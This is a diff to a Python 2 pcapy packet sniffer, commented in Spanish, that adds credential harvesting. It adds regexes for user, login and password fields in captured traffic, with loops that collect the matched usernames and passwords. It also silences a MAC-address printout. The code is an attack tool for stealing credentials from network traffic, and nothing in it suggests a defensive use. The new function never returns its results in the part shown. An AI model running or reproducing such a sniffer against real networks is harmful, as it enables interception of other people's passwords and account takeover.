@@ -7,6 +7,7 @@ import socket
 from struct import *
 import pcapy
 import re
+import io
 
 class Main:
     __title__ = "Sniffer"
@@ -53,12 +54,34 @@ class Main:
 
     def parserCredentials(self, data):
         expresionesUser = []
+        expresionesPass = []
         foundUsers = []
+        foundPassw = []
+        # Expresiones regulares para encontrar parámetros de usuario
         expresionesUser.append("[^|&].*[uU][sS][eE][rR][^=]*=([^&]*)")
         expresionesUser.append("[^|&].*[lL][oO][gG][iI][nN][^=]*=([^&]*)")
         expresionesUser.append("[^|&].*[aA][pP][oO][dD][oO][^=]*=([^&]*)")
         expresionesUser.append("[^|&].*[uU][sS][rR][^=]*=([^&]*)")
-        re.findall()
+
+        # Expresiones regulares para encontrar parámetros de contraseña
+        expresionesPass.append("[^|&].*[pP][aA][sS][sS][^=]*=([^&]*)")
+        expresionesPass.append("[^|&].*[pP][aA][sS][sS][wW][oO][rR][dD][^=]*=([^&]*)")
+        expresionesPass.append("[^|&].*[pP][sS][sS][wW][^=]*=([^&]*)")
+        expresionesPass.append("[^|&].*[pP][sS][sS][wW][dD][^=]*=([^&]*)")
+        expresionesPass.append("[^|&].*[pP][wW][dD][^=]*=([^&]*)")
+        expresionesPass.append("[^|&].*[pP][sS][wW][dD][^=]*=([^&]*)")
+
+        for expression in expresionesUser:
+            for line in data.split('\n'):
+                search = re.findall(expression, line)
+                if len(search) > 0:
+                    foundUsers.append(search[0])
+
+        for expression in expresionesPass:
+            for line in data.split('\n'):
+                search = re.findall(expression, line)
+                if len(search) > 0:
+                    foundPassw.append(search[0])
 
     # Función de parseo del paquete
     def parse_packet(self, packet, options):
@@ -68,8 +91,7 @@ class Main:
         eth_header = packet[:eth_length]
         eth = unpack('!6s6sH', eth_header)
         eth_protocol = socket.ntohs(eth[2])
-        print 'Destination MAC : ' + self.eth_addr(packet[0:6]) + ' Source MAC : ' + self.eth_addr(
-            packet[6:12]) + ' Protocol : ' + str(eth_protocol)
+        # print 'Destination MAC : ' + self.eth_addr(packet[0:6]) + ' Source MAC : ' + self.eth_addr(packet[6:12]) + ' Protocol : ' + str(eth_protocol)
 
         # Parseamos todos los paquete tipo IP
         if eth_protocol == 8:
